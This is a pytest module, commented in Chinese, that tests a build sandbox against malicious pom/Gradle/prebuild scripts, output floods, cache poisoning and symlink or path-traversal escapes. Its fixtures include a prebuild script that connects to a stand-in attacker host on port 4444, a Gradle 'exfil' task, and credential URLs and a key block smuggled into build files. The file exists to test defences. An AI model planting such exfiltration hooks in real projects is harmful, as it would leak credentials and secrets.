"""Threat-vector security tests (主计划 §6.3 沙箱威胁模型, 指南 §10.1).

§6.3 要求沙箱威胁模型覆盖恶意 Maven/Gradle 插件、构建脚本、符号链接、
路径穿越、输出洪水、缓存投毒, 且每一条威胁都要有测试。本模块补齐 4 条
此前没有专属测试的威胁向量; 全部使用现有策略对象 + fake runner, 无
Docker、无网络:

- 恶意 pom/gradle/构建脚本: craft.gates.security_gate + agent.security_scanner
  (检测并按 CRITICAL/HIGH 拦截) + craft.executor 命令白名单 + ToolRegistry
  default-deny (脚本执行拦截) -> TestMaliciousBuildContent
- 输出洪水: craft.executor OUTPUT_TAIL_CHARS 尾部截断 + craft.tools
  head/tail split 与 truncated 标记 -> TestOutputFlood
- 缓存投毒: 本模块 standalone digest 校验 (生产 cache-verify adapter
  尚未落地) -> TestCachePoisoning
- 符号链接逃逸/路径穿越: 本模块 standalone 根目录约束 (repo_safety 模块
  尚未落地) -> TestSymlinkEscape

给 captain 的去重说明:
1. 沙箱加固 flags (non-root / network none / 只读挂载) 已由
   tests/unit/test_sandbox_runner.py 的 15 个边界测试覆盖, 此处不重复。
2. verify_cache_digests / resolve_repo_path 是本模块内的 standalone
   实现, 供对应生产模块落地时原样提升; 落地后请删除本模块副本并指向
   其公共 API (repo_safety / cache-verify adapter)。
3. 拦截动作是 fail-closed: gate failed / whitelist deny; 管线目前没有
   quarantine 动作实现, 若需要 quarantine 属于管线新策略, 不在此测试。
"""

from __future__ import annotations

import hashlib
import os
from collections.abc import Callable, Mapping
from dataclasses import dataclass, field
from pathlib import Path
from typing import Protocol

import pytest

from agent.security_scanner import scan_directory
from craft.executor import OUTPUT_TAIL_CHARS, CommandNotAllowedError, ExecResult, Executor
from craft.gates import run_build_gate, security_gate
from craft.tools import CODE_COMMAND_NOT_ALLOWED, HEAD_CHARS, TAIL_CHARS, ToolRegistry
from experiments.adapters import parse_surefire_summary
from sandbox.runner import SandboxResult

# ══════════════════════════════════════════════════════════════════
# 威胁 1: 恶意 pom/gradle/构建脚本 (§6.3 恶意 Maven/Gradle 插件、构建脚本)
# ══════════════════════════════════════════════════════════════════


def _malicious_pom() -> str:
    """pom.xml smuggling a JDBC credential URL and a private key block."""
    key_block = (
        "-----BEGIN " + "PRIVATE KEY-----\n"
        "MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQC0smuggleddata\n"
        "-----END " + "PRIVATE KEY-----\n"
    )
    jdbc = "jdbc:mysql://ci-bot:sup3r_pw@db.internal.specproof:3306/specproof"
    return (
        "<project>\n"
        "  <artifactId>demo</artifactId>\n"
        "  <properties>\n"
        f"    <jdbc.url>{jdbc}</jdbc.url>\n"
        f"    <smuggled.key>{key_block}</smuggled.key>\n"
        "  </properties>\n"
        "</project>\n"
    )


def _malicious_gradle() -> str:
    """build.gradle exfiltrating a redis credential URL and an API key."""
    redis_url = "redis://attacker:sup3r_pw@cache.internal.specproof:6379/0"
    return (
        "plugins { id 'java' }\n"
        "task exfil {\n"
        "    doLast {\n"
        f"        def endpoint = '{redis_url}'\n"
        "        def api = 'API_KEY=exfil-token-value'\n"
        "        println endpoint\n"
        "    }\n"
        "}\n"
    )


def _malicious_script() -> str:
    """prebuild.py smuggled into the PR, exfiltrating via a Bearer header."""
    header = "Authorization: Bearer " + "tk_" + "z" * 20
    return (
        "#!/usr/bin/env python\n"
        '"""Prebuild hook smuggled by a malicious PR."""\n'
        "import socket\n"
        "\n"
        f"EXFIL_HEADER = '{header}'\n"
        "def main() -> None:\n"
        "    socket.create_connection(('evil.internal.specproof', 4444))\n"
        "\n"
        "if __name__ == '__main__':\n"
        "    main()\n"
    )


def _benign_pom() -> str:
    return (
        "<project>\n"
        "  <groupId>com.specproof.demo</groupId>\n"
        "  <artifactId>spring-backend</artifactId>\n"
        "  <version>1.0.0</version>\n"
        "</project>\n"
    )


def _refuse_sandbox(monkeypatch: pytest.MonkeyPatch) -> list[list[str]]:
    """Fake sandbox that fails the test if any command actually reaches it."""
    calls: list[list[str]] = []

    def fake_run_sandboxed(
        command: list[str],
        workspace: str,
        timeout: int,
        mode: str | None = None,
        local_command: list[str] | None = None,
    ) -> SandboxResult:
        calls.append(command)
        raise AssertionError("命令不应到达沙箱: 预检查必须先行拦截")

    monkeypatch.setattr("craft.executor.run_sandboxed", fake_run_sandboxed)
    return calls


class _RefusingRunner:
    """Fake ExecRunner: refuses every command like a whitelist deny."""

    def run(self, command: list[str], *, timeout: int | None = None) -> ExecResult:
        raise CommandNotAllowedError(
            f"命令 '{command[0]}' 不在白名单 (恶意构建脚本被拒绝)"
        )


class TestMaliciousBuildContent:
    """Malicious build content must be detected and blocked pre-execution."""

    def test_scanner_detects_malicious_content_in_all_build_files(
        self, tmp_path: Path,
    ) -> None:
        workspace = tmp_path / "repo"
        workspace.mkdir()
        (workspace / "pom.xml").write_text(_malicious_pom(), encoding="utf-8")
        (workspace / "build.gradle").write_text(_malicious_gradle(), encoding="utf-8")
        (workspace / "prebuild.py").write_text(_malicious_script(), encoding="utf-8")
        scan_result = scan_directory(str(workspace))
        blocking = {
            finding.path
            for finding in scan_result.findings
            if finding.severity in ("CRITICAL", "HIGH")
        }
        assert {"pom.xml", "build.gradle", "prebuild.py"} <= blocking
        assert scan_result.passed is False

    @pytest.mark.parametrize(
        ("filename", "content"),
        [
            ("pom.xml", _malicious_pom),
            ("build.gradle", _malicious_gradle),
            ("prebuild.py", _malicious_script),
        ],
        ids=["maven-pom", "gradle-build", "python-prebuild"],
    )
    def test_security_gate_blocks_malicious_changed_build_file(
        self,
        tmp_path: Path,
        filename: str,
        content: Callable[[], str],
    ) -> None:
        workspace = tmp_path / "repo"
        workspace.mkdir()
        (workspace / filename).write_text(content(), encoding="utf-8")
        result = security_gate([filename], workspace)
        assert result.status == "failed"
        assert "交付被拦截" in result.note
        assert result.findings, "malicious content must produce blocking findings"
        assert all(finding["file"] == filename for finding in result.findings)
        assert any(
            finding["severity"] in ("CRITICAL", "HIGH") for finding in result.findings
        )

    def test_security_gate_passes_benign_pom(self, tmp_path: Path) -> None:
        workspace = tmp_path / "repo"
        workspace.mkdir()
        (workspace / "pom.xml").write_text(_benign_pom(), encoding="utf-8")
        result = security_gate(["pom.xml"], workspace)
        assert result.status == "passed"
        assert result.findings == []

    def test_security_gate_ignores_malicious_file_outside_changed_set(
        self, tmp_path: Path,
    ) -> None:
        """Only the PR's own changed files may block; pre-existing malicious
        files elsewhere in the worktree are not attributed to this PR."""
        workspace = tmp_path / "repo"
        workspace.mkdir()
        (workspace / "pom.xml").write_text(_malicious_pom(), encoding="utf-8")
        result = security_gate(["src/main/java/App.java"], workspace)
        assert result.status == "passed"
        assert result.findings == []

    def test_executor_whitelist_rejects_malicious_script_before_execution(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        calls = _refuse_sandbox(monkeypatch)
        executor = Executor(tmp_path)
        with pytest.raises(CommandNotAllowedError, match="不在白名单"):
            executor.run(["evil-build-script", "--exfiltrate"])
        assert calls == []

    def test_tool_registry_denies_malicious_script_command(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        calls = _refuse_sandbox(monkeypatch)
        registry = ToolRegistry(workspace=tmp_path, executor=Executor(tmp_path))
        call = registry.build_tool_call(
            "run_build", {"command": ["evil-build-script", "--exfiltrate"], "timeout": 60}
        )
        result = registry.dispatch(call)
        assert result.status == "denied"
        assert f"[{CODE_COMMAND_NOT_ALLOWED}]" in result.summary
        assert calls == []

    def test_run_build_gate_never_fabricates_pass_when_executor_refuses(
        self, tmp_path: Path,
    ) -> None:
        workspace = tmp_path / "repo"
        workspace.mkdir()
        (workspace / "pom.xml").write_text(_benign_pom(), encoding="utf-8")
        result = run_build_gate(workspace, executor=_RefusingRunner())
        assert result.gate == "run_build"
        assert result.status == "error"
        assert "CommandNotAllowedError" in result.note


# ══════════════════════════════════════════════════════════════════
# 威胁 2: 输出洪水 (§6.3 输出洪水; executor 尾部截断 + truncated 标记)
# ══════════════════════════════════════════════════════════════════


def _flood_sandbox(
    monkeypatch: pytest.MonkeyPatch, stdout: str,
) -> list[list[str]]:
    """Fake sandbox returning a chosen stdout flood (no real subprocess)."""
    calls: list[list[str]] = []

    def fake_run_sandboxed(
        command: list[str],
        workspace: str,
        timeout: int,
        mode: str | None = None,
        local_command: list[str] | None = None,
    ) -> SandboxResult:
        calls.append(command)
        return SandboxResult(exit_code=0, stdout=stdout, stderr="", error="", mode="local")

    monkeypatch.setattr("craft.executor.run_sandboxed", fake_run_sandboxed)
    return calls


class TestOutputFlood:
    """Oversized subprocess output is truncated with an honest marker."""

    _SUMMARY = "\n[INFO] Tests run: 3, Failures: 1, Errors: 0, Skipped: 0\n"

    def test_flooded_output_truncated_and_summary_survives_in_tail(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        flood = "F" * 200_000
        _flood_sandbox(monkeypatch, flood + self._SUMMARY)
        result = Executor(tmp_path).run(["mvn", "-o", "test"])
        assert result.truncated is True
        assert len(result.output_tail) == OUTPUT_TAIL_CHARS
        assert parse_surefire_summary(result.output_tail) == {
            "tests": 3, "failures": 1, "errors": 0, "skipped": 0,
        }

    def test_output_exactly_at_limit_not_truncated(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        stdout = "F" * OUTPUT_TAIL_CHARS
        _flood_sandbox(monkeypatch, stdout)
        result = Executor(tmp_path).run(["mvn", "-o", "test"])
        assert result.truncated is False
        assert result.output_tail == stdout

    def test_output_one_char_over_limit_truncated(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        stdout = "F" * (OUTPUT_TAIL_CHARS + 1)
        _flood_sandbox(monkeypatch, stdout)
        result = Executor(tmp_path).run(["mvn", "-o", "test"])
        assert result.truncated is True
        assert len(result.output_tail) == OUTPUT_TAIL_CHARS
        assert result.output_tail == stdout[1:]

    def test_registry_marks_flooded_result_truncated_and_untrusted(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch,
    ) -> None:
        flood = "G" * 200_000
        _flood_sandbox(monkeypatch, flood + self._SUMMARY)
        registry = ToolRegistry(workspace=tmp_path, executor=Executor(tmp_path))
        call = registry.build_tool_call(
            "run_build", {"command": ["mvn", "-o", "test"], "timeout": 60}
        )
        result = registry.dispatch(call)
        assert result.status == "ok"
        assert result.truncated is True
        assert len(result.output_head) == HEAD_CHARS
        assert len(result.output_tail) == TAIL_CHARS
        assert "Tests run:" in result.output_tail
        assert "untrusted" in result.security_tags


# ══════════════════════════════════════════════════════════════════
# 威胁 3: 缓存投毒 (§6.3 缓存投毒; 种子化 .m2 卷的 artifact digest 校验)
# ══════════════════════════════════════════════════════════════════


class CacheStore(Protocol):
    """Artifact-store surface a cache verifier needs (fake in tests)."""

    def read(self, rel_path: str) -> bytes:
        """Return the cached artifact's raw bytes."""


@dataclass(frozen=True)
class DigestMismatch:
    """One manifest entry whose cached bytes do not hash to the expected digest."""

    rel_path: str
    expected: str
    actual: str


def artifact_sha256(data: bytes) -> str:
    """Hex sha256 of raw artifact bytes (same shape as craft.schemas.Artifact)."""
    return hashlib.sha256(data).hexdigest()


def verify_cache_digests(
    store: CacheStore, manifest: Mapping[str, str],
) -> list[DigestMismatch]:
    """Compare every manifest entry against the cached bytes (fail-closed).

    A poisoned artifact (content swapped after seeding) hashes differently;
    an entry missing from the store is also reported — an incomplete cache
    is an integrity failure, never silently trusted.
    """
    mismatches: list[DigestMismatch] = []
    for rel_path, expected in manifest.items():
        try:
            data = store.read(rel_path)
        except KeyError:
            mismatches.append(DigestMismatch(rel_path, expected, "<absent>"))
            continue
        actual = artifact_sha256(data)
        if actual != expected:
            mismatches.append(DigestMismatch(rel_path, expected, actual))
    return mismatches


@dataclass
class FakeCacheStore:
    """Fake cache adapter: in-memory artifact bytes, KeyError when absent."""

    artifacts: dict[str, bytes] = field(default_factory=dict)

    def read(self, rel_path: str) -> bytes:
        return self.artifacts[rel_path]


class TestCachePoisoning:
    """Poisoned .m2 cache artifacts must be caught by digest verification."""

    def test_poisoned_artifact_digest_mismatch_detected(self) -> None:
        legit = b"legitimate artifact bytes"
        poisoned = b"attacker-controlled artifact bytes"
        store = FakeCacheStore({"org/demo/app.jar": poisoned})
        manifest = {"org/demo/app.jar": artifact_sha256(legit)}
        mismatches = verify_cache_digests(store, manifest)
        assert len(mismatches) == 1
        assert mismatches[0].rel_path == "org/demo/app.jar"
        assert mismatches[0].expected == artifact_sha256(legit)
        assert mismatches[0].actual == artifact_sha256(poisoned)

    def test_clean_artifact_digest_matches_manifest(self) -> None:
        content = b"clean artifact bytes"
        store = FakeCacheStore({"org/demo/app.jar": content})
        manifest = {"org/demo/app.jar": artifact_sha256(content)}
        assert verify_cache_digests(store, manifest) == []

    def test_absent_artifact_fails_closed(self) -> None:
        store = FakeCacheStore({})
        manifest = {"org/demo/missing.jar": "0" * 64}
        mismatches = verify_cache_digests(store, manifest)
        assert len(mismatches) == 1
        assert mismatches[0].rel_path == "org/demo/missing.jar"
        assert mismatches[0].actual == "<absent>"


# ══════════════════════════════════════════════════════════════════
# 威胁 4: 符号链接逃逸 / 路径穿越 (§6.3 符号链接、路径穿越)
# ══════════════════════════════════════════════════════════════════

Resolver = Callable[[Path], Path]


class SymlinkEscapeError(RuntimeError):
    """A repo path resolves (through symlinks or ..) outside the allowed root."""

    def __init__(self, rel_path: str, resolved: str) -> None:
        self.rel_path = rel_path
        self.resolved = resolved
        super().__init__(f"路径逃逸: {rel_path!r} 解析到允许根目录之外: {resolved}")


def resolve_repo_path(
    allowed_root: str | Path,
    rel_path: str,
    resolver: Resolver | None = None,
) -> Path:
    """Resolve a repo-relative path and reject escapes.

    Standalone containment check: the repo_safety module does not exist yet
    (dedup note for the captain — promote verbatim when it lands). Absolute
    paths, .. traversal and symlinks resolving outside allowed_root all
    raise SymlinkEscapeError.
    """
    root = Path(allowed_root).resolve()
    raw = Path(rel_path)
    if raw.is_absolute():
        raise SymlinkEscapeError(rel_path, str(raw))
    candidate = root / raw
    resolved = resolver(candidate) if resolver is not None else candidate.resolve()
    if not resolved.is_relative_to(root):
        raise SymlinkEscapeError(rel_path, str(resolved))
    return resolved


def _make_symlink(link: Path, target: Path) -> None:
    """Create a symlink; skip loudly when the platform forbids it.

    Windows requires Developer Mode or admin for os.symlink — the check
    itself is platform-independent (see the fake-resolver test); the real
    symlink test only exercises the OS layer when permitted.
    """
    try:
        os.symlink(str(target), str(link))
    except OSError as exc:
        pytest.skip(f"平台不允许创建符号链接 (Windows 需开发者模式/管理员): {exc}")


class TestSymlinkEscape:
    """Symlinks and .. traversal must never escape the allowed root."""

    def test_absolute_path_rejected(self, tmp_path: Path) -> None:
        outside = tmp_path / "outside" / "secret.txt"
        with pytest.raises(SymlinkEscapeError) as excinfo:
            resolve_repo_path(tmp_path, str(outside))
        err = excinfo.value
        assert isinstance(err, SymlinkEscapeError)
        assert "secret.txt" in err.resolved

    def test_dotdot_traversal_rejected(self, tmp_path: Path) -> None:
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        with pytest.raises(SymlinkEscapeError, match="路径逃逸"):
            resolve_repo_path(allowed, "../secret.txt")

    def test_fake_resolver_escape_rejected(self, tmp_path: Path) -> None:
        allowed = tmp_path / "allowed"
        outside = tmp_path / "outside"

        def fake_resolve(_path: Path) -> Path:
            return outside

        with pytest.raises(SymlinkEscapeError) as excinfo:
            resolve_repo_path(allowed, "link.txt", resolver=fake_resolve)
        err = excinfo.value
        assert isinstance(err, SymlinkEscapeError)
        assert err.rel_path == "link.txt"
        assert err.resolved == str(outside)

    def test_regular_file_inside_root_allowed(self, tmp_path: Path) -> None:
        allowed = tmp_path / "allowed"
        target = allowed / "src" / "Main.java"
        target.parent.mkdir(parents=True)
        target.write_text("class Main {}", encoding="utf-8")
        resolved = resolve_repo_path(allowed, "src/Main.java")
        assert resolved == target.resolve()

    def test_real_symlink_escape_rejected_if_platform_allows(
        self, tmp_path: Path,
    ) -> None:
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        outside = tmp_path / "secret.txt"
        outside.write_text("host secret", encoding="utf-8")
        _make_symlink(allowed / "link.txt", outside)
        with pytest.raises(SymlinkEscapeError, match="路径逃逸"):
            resolve_repo_path(allowed, "link.txt")

    def test_real_symlink_inside_root_allowed_if_platform_allows(
        self, tmp_path: Path,
    ) -> None:
        allowed = tmp_path / "allowed"
        allowed.mkdir()
        real = allowed / "real.txt"
        real.write_text("content", encoding="utf-8")
        _make_symlink(allowed / "link.txt", real)
        resolved = resolve_repo_path(allowed, "link.txt")
        assert resolved == real.resolve()
